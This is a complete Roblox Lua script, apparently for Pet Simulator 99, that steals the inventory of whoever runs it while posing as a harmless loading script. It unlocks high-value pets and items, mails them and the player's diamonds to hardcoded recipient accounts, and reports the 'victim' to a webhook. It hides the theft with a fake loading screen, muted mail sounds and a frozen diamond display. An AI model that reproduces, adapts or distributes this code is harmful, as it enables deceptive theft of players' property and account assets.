-- ============================
-- Full integrated script
-- - Visual freeze (local only)
-- - Send inventory items (Gargantuan/Titanic/Huge/ExclusiveLevel pets only)
-- - Send leftover diamonds after all items
-- - Webhook with k/m/b/t formatting
-- - Suppress mail sounds
-- - One-time GUI "Please wait while the script loads..."
-- - Diagnostics printed to the console
-- ============================

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

print("[INFO] Script started")

-- ======= Requirements / shortcuts =======
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local plr = Players.LocalPlayer

-- network/save modules (may error if not present; assume same structure as before)
local network = require(ReplicatedStorage.Library.Client.Network)
local SaveModule = require(ReplicatedStorage.Library.Client.Save)
local save = SaveModule.Get().Inventory  -- snapshot reference to inventory table
local message = require(ReplicatedStorage.Library.Client.Message)

-- config (use _G overrides)
local MailMessage = "GGz"
local min_rap = _G.minrap or 10000000
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end
for _, u in ipairs(users) do
    if plr.Name == u then plr:kick("You cannot mailsteal yourself") return end
end

-- ======= helper: find mail cost function =======
local FunctionToGetFirstPriceOfMail
for _, fn in pairs(getgc()) do
    if type(fn) == "function" then
        local info = debug.getinfo(fn)
        if info and info.name == "computeSendMailCost" then
            FunctionToGetFirstPriceOfMail = fn
            break
        end
    end
end
if not FunctionToGetFirstPriceOfMail then
    warn("[WARN] computeSendMailCost not found in getgc; defaulting mail price to 1")
    FunctionToGetFirstPriceOfMail = function() return 1 end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()
print("[INFO] Mail first price:", mailSendPrice)

-- ======= initial diamonds (real inventory) =======
local function currentSave() return SaveModule.Get() end
local GemAmount1 = 1
do
    local s = currentSave().Inventory
    for index, v in ipairs(s.Currency) do
        if v.id == "Diamonds" then
            GemAmount1 = v._am
            break
        end
    end
end
print("[INFO] Total diamonds (inventory):", GemAmount1)

-- ======= format numbers for webhook =======
local function formatNumber(number)
    number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- ======= safe RAP getter =======
local RAPCmds
local okRAP, rapErr = pcall(function()
    RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)
end)
if not okRAP or not RAPCmds then
    warn("[WARN] RAPCmds not available; getRAP will return 0 for all items.")
end

local function getRAP(Type, Item)
    if RAPCmds and RAPCmds.Get then
        local ok, val = pcall(function()
            return RAPCmds.Get({
                Class = {Name = Type},
                IsA = function(hmm) return hmm == Type end,
                GetId = function() return Item.id end,
                StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
                AbstractGetRAP = function(self) return nil end
            })
        end)
        if ok and val then return val end
        return 0
    end
    return 0
end

-- ======= webhook function (uses formatNumber) =======
local function SendWebhook(diamonds, sortedItems, totalRAP)
    if not webhook or webhook == "" then return end
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    local itemRapMap = {}
    local combinedItems = {}
    for _, item in ipairs(sortedItems) do
        local key = item.name
        if itemRapMap[key] then
            itemRapMap[key].amount = itemRapMap[key].amount + item.amount
        else
            itemRapMap[key] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, key)
        end
    end

    table.sort(combinedItems, function(a,b) return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount end)

    for _, name in ipairs(combinedItems) do
        local d = itemRapMap[name]
        fields[2].value = fields[2].value .. string.format("%s (x%d): %s RAP\n", name, d.amount, formatNumber(d.rap * d.amount))
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = { embeds = {{ title = "💱 New PS99 Execution", color = 65280, fields = fields, footer = { text = "Strike Hub." } }} }
    local ok, err = pcall(function()
        request({ Url = webhook, Method = "POST", Headers = headers, Body = HttpService:JSONEncode(data) })
    end)
    if not ok then warn("[WARN] Webhook request failed:", err) end
end

-- ======= GUI (one-time) =======
local function createOneTimeGUI()
    local PlayerGui = plr:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StrikeHub_LoadingGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 60)
    frame.Position = UDim2.new(0.5, -175, 0.9, -30)
    frame.BackgroundTransparency = 0.2
    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    frame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "Please wait while the script loads"
    label.TextColor3 = Color3.fromRGB(0,255,0)
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.Parent = frame

    return screenGui, label
end

local screenGui, loadingLabel = createOneTimeGUI()

-- ======= suppress mail sounds =======
game.DescendantAdded:Connect(function(x)
    if x:IsA("Sound") then
        local sid = tostring(x.SoundId or "")
        if sid == "rbxassetid://11839132565" or sid == "rbxassetid://14254721038" or sid == "rbxassetid://12413423276" then
            pcall(function()
                x.Volume = 0
                x.PlayOnRemove = false
                x:Destroy()
            end)
        end
    end
end)

-- ======= VISUAL FREEZE (local-only) =======
-- freeze initial diamonds based on real inventory snapshot
local frozenDiamonds = GemAmount1

-- pets heuristics: prefer attribute "Equipped", otherwise Owner StringValue, otherwise proximity to character
local function isPetEquippedModel(model)
    if not model or not model:IsA("Model") then return false end
    -- attribute
    if model:GetAttribute("Equipped") then return true end
    -- Owner value
    local ownerVal = model:FindFirstChild("Owner") or model:FindFirstChild("owner") or model:FindFirstChild("Player")
    if ownerVal and (ownerVal:IsA("StringValue") or ownerVal:IsA("ObjectValue")) then
        if ownerVal.Value == plr.Name or (ownerVal.Value and tostring(ownerVal.Value) == plr.Name) then
            return true
        end
    end
    -- proximity fallback (within 50 studs of player's primary part)
    if plr.Character and plr.Character.PrimaryPart and model.PrimaryPart then
        local ok, dist = pcall(function()
            return (model.PrimaryPart.Position - plr.Character.PrimaryPart.Position).Magnitude
        end)
        if ok and dist and dist < 50 then
            return true
        end
    end
    return false
end

local petsFolder = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Pets")
if not petsFolder then
    warn("[WARN] Pets folder not found at workspace.__THINGS.Pets - visual freeze may not anchor pets.")
end

local function anchorModelParts(model)
    for _, d in ipairs(model:GetDescendants()) do
        if d:IsA("BasePart") then
            pcall(function() d.Anchored = true end)
        end
    end
end

local function unanchorModelParts(model)
    for _, d in ipairs(model:GetDescendants()) do
        if d:IsA("BasePart") then
            pcall(function() d.Anchored = false end)
        end
    end
end

local freezeConnection
freezeConnection = RunService.RenderStepped:Connect(function()
    -- override diamonds display locally
    local leaderstats = plr:FindFirstChild("leaderstats")
    if leaderstats then
        local diamondsValue = leaderstats:FindFirstChild("💎 Diamonds") or leaderstats:FindFirstChild("Diamonds")
        if diamondsValue then
            pcall(function() diamondsValue.Value = frozenDiamonds end)
        end
    end

    -- anchor only equipped/nearby pets (heuristics)
    if petsFolder then
        for _, pet in ipairs(petsFolder:GetChildren()) do
            if isPetEquippedModel(pet) then
                anchorModelParts(pet)
            end
        end
    end
end)

plr.AncestryChanged:Connect(function(_, parent)
    if not parent then
        if freezeConnection then pcall(function() freezeConnection:Disconnect() end) end
        -- unanchor handled best-effort
        if petsFolder then
            for _, pet in ipairs(petsFolder:GetChildren()) do
                pcall(function() unanchorModelParts(pet) end)
            end
        end
        if screenGui then pcall(function() screenGui:Destroy() end) end
    end
end)

-- ======= helper: unlock boxes and claim =======
local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
                pcall(function() network.Invoke("Box: Withdraw All", key) end)
            end
        end
    end
end

local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.2)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

local function canSendMail()
    local sampleUID
    if save["Pet"] then
        for k,_ in pairs(save["Pet"]) do sampleUID = k break end
    end
    if not sampleUID then
        warn("[WARN] no sample pet uid to test mailbox")
        return true
    end
    local args = {[1]="Roblox",[2]="Test",[3]="Pet",[4]=sampleUID,[5]=1}
    local response, err = network.Invoke("Mailbox: Send", unpack(args))
    return (err == "They don't have enough space!")
end

-- ======= MAIN SENDING LOGIC (safe & robust) =======
local function sendInventoryItems()
    print("[INFO] Collecting items... (this only reads your real inventory)")
    local sortedItems = {}
    totalRAP = 0

    local categoryList = {"Pet","Egg","Charm","Enchant","Potion","Misc","Ultimate"}
    for _, category in ipairs(categoryList) do
        if save[category] then
            for uid, item in pairs(save[category]) do
                local rapValue = getRAP(category, item)
                -- pets: only gargantuan/titanic/huge/exclusiveLevel
                if category == "Pet" then
                    local ok, dir = pcall(function()
                        return ReplicatedStorage.Library.Directory.Pets[item.id]
                    end)
                    if ok and dir and (dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel) and rapValue >= min_rap then
                        local prefix = ""
                        if item.pt == 1 then prefix = "Golden " elseif item.pt == 2 then prefix = "Rainbow " end
                        if item.sh then prefix = "Shiny "..prefix end
                        local id = prefix .. item.id
                        table.insert(sortedItems, { category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = id })
                        totalRAP = totalRAP + rapValue * (item._am or 1)
                        print("[INFO] Queued pet:", id, "uid:", uid, "amount:", item._am or 1, "rap:", rapValue)
                    end
                else
                    if rapValue >= min_rap then
                        table.insert(sortedItems, { category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id })
                        totalRAP = totalRAP + rapValue * (item._am or 1)
                        print("[INFO] Queued item:", item.id, "uid:", uid, "amount:", item._am or 1, "rap:", rapValue)
                    end
                end

                if item._lk then
                    pcall(function() network.Invoke("Locking_SetLocked", uid, false) end)
                    print("[INFO] Unlocked item:", uid)
                end
            end
        end
    end

    print("[INFO] Total items queued:", #sortedItems, "Total RAP:", totalRAP)

    -- sort by rap*amount desc
    table.sort(sortedItems, function(a,b) return (a.rap * a.amount) > (b.rap * b.amount) end)

    -- send webhook (non-blocking)
    spawn(function()
        SendWebhook(GemAmount1, sortedItems, totalRAP)
    end)

    -- Pre-send: claim and empty boxes
    ClaimMail()
    EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Please rejoin or use a different account")
        return
    end

    -- send items: one unit at a time to current user until user's mailbox full, then next user
    for _, item in ipairs(sortedItems) do
        if item.rap < min_rap then
            print("[INFO] Skipping item (below min_rap):", item.name)
            break
        end

        local remaining = item.amount
        local userIndex = 1
        local maxUsers = #users

        while remaining > 0 do
            local currentUser = users[userIndex]
            local args = {[1] = currentUser, [2] = MailMessage, [3] = item.category, [4] = item.uid, [5] = 1}
            print("[DEBUG] Trying to send 1x", item.name, "to", currentUser, "remaining:", remaining, "current mail cost:", mailSendPrice)
            local response, err = network.Invoke("Mailbox: Send", unpack(args))
            if response == true then
                GemAmount1 = GemAmount1 - mailSendPrice
                mailSendPrice = math.ceil(mailSendPrice * 1.5)
                if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
                remaining = remaining - 1
                print("[INFO] Sent 1x", item.name, "to", currentUser, "new remaining:", remaining, "gems left:", GemAmount1)
            elseif err == "They don't have enough space!" then
                userIndex = userIndex + 1
                if userIndex > maxUsers then
                    warn("[WARN] All mailboxes full for item:", item.uid)
                    break
                else
                    print("[INFO] Mailbox full for", currentUser, "switching to", users[userIndex])
                end
            else
                warn("[WARN] Failed to send item:", item.uid, tostring(err))
                break
            end
        end
    end

    -- After all items are attempted, send leftover diamonds in one send per user
    if GemAmount1 > mailSendPrice then
        print("[INFO] Sending leftover diamonds:", GemAmount1)
        local remainingGems = GemAmount1
        local userIndex = 1
        local maxUsers = #users
        while remainingGems > 0 do
            local currentUser = users[userIndex]
            -- find the currency index dynamically from the live save
            local liveSave = currentSave().Inventory
            local currencyIndex = nil
            for idx, v in ipairs(liveSave.Currency) do
                if v.id == "Diamonds" then
                    currencyIndex = idx
                    break
                end
            end
            if not currencyIndex then
                warn("[WARN] Could not locate Diamonds currency index in live save; aborting gem send.")
                break
            end

            local args = {[1] = currentUser, [2] = MailMessage, [3] = "Currency", [4] = currencyIndex, [5] = remainingGems}
            print("[DEBUG] Trying to send gems:", remainingGems, "to", currentUser)
            local response, err = network.Invoke("Mailbox: Send", unpack(args))
            if response == true then
                GemAmount1 = GemAmount1 - remainingGems
                remainingGems = 0
                print("[INFO] Sent remaining gems to", currentUser)
            elseif err == "They don't have enough space!" then
                userIndex = userIndex + 1
                if userIndex > maxUsers then
                    warn("[WARN] All mailboxes full for gems")
                    break
                else
                    print("[INFO] Gems: mailbox full for", currentUser, "switching to", users[userIndex])
                end
            else
                warn("[WARN] Failed to send gems:", tostring(err))
                break
            end
        end
    else
        print("[INFO] Not enough gems to send after items or below mail cost.")
    end

    print("[INFO] sendInventoryItems finished")
    loadingLabel.Text = "All items and gems have been sent!"
end

-- Run main
spawn(function()
    -- give small moment for GUI and freeze to start consistently
    task.wait(0.1)
    sendInventoryItems()
end)
